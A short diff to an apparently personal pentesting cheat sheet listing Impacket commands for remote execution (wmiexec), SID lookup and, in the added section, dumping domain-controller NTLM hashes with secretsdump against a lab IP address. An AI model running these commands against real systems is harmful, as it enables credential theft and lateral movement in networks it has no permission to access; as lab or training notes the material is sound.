@@ -33,3 +33,8 @@ $python3 wmiexec.py <username:password@hostname>
 $python3 lookupsid.py <domain/username@hostname>
 $python3 lookupsid.py <domain/username:password@hostname>
 ```
+
+## SecretsDumping
+```
+python3 secretsdump.py -just-dc-ntlm <domain>/<username>@10.10.236.46 (when prompted enter password)
+```
